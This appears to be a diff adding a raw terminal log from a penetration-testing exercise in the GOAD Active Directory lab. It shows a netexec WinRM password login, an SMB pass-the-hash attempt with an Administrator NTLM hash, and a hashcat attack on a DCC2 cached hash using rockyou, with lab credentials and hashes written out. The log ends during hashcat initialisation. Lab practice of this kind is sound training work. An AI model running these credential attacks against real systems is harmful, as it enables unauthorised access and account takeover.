@@ -1,0 +1,42 @@
+──(kali㉿kali)-[~/Desktop/GOAD]
+└─$ netexec winrm 192.168.56.11 -u sql_svc -p 'YouWillNotKerboroast1ngMeeeeee' 
+WINRM       192.168.56.11   5985   WINTERFELL       [*] Windows 10 / Server 2019 Build 17763 (name:WINTERFELL) (domain:north.sevenkingdoms.local)
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+WINRM       192.168.56.11   5985   WINTERFELL       [-] north.sevenkingdoms.local\sql_svc:YouWillNotKerboroast1ngMeeeeee
+                                                                                                                                                            
+┌──(kali㉿kali)-[~/Desktop/GOAD]
+└─$ netexec smb 192.168.56.11 \
+-u Administrator \
+-H dbd13e1c4e338284ac4e9874f7de6ef4 \
+--local-auth
+SMB         192.168.56.11   445    WINTERFELL       [*] Windows 10 / Server 2019 Build 17763 x64 (name:WINTERFELL) (domain:WINTERFELL) (signing:True) (SMBv1:False)                                                                                                                                                     
+SMB         192.168.56.11   445    WINTERFELL       [-] WINTERFELL\Administrator:dbd13e1c4e338284ac4e9874f7de6ef4 STATUS_LOGON_FAILURE 
+                                                                                                                                                            
+┌──(kali㉿kali)-[~/Desktop/GOAD]
+└─$ hashcat -m 2100 '$DCC2$10240#robb.stark#f19bfb9b10ba923f2e28b733e5dd1405' \
+/usr/share/wordlists/rockyou.txt
+hashcat (v7.1.2) starting
+
+OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
+====================================================================================================================================================
+* Device #01: cpu-haswell-Intel(R) Core(TM) i5-7300U CPU @ 2.60GHz, 725/1451 MB (256 MB allocatable), 4MCU
+
+Minimum password length supported by kernel: 0
+Maximum password length supported by kernel: 256
+Minimum salt length supported by kernel: 0
+Maximum salt length supported by kernel: 256
+
+Hashes: 1 digests; 1 unique digests, 1 unique salts
+Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
+Rules: 1
+
+Optimizers applied:
+* Zero-Byte
+* Single-Hash
+* Single-Salt
+* Slow-Hash-SIMD-LOOP
+
+Watchdog: Temperature abort trigger set to 90c
+
+Initializing backend runtime for device #1. Please be patient...
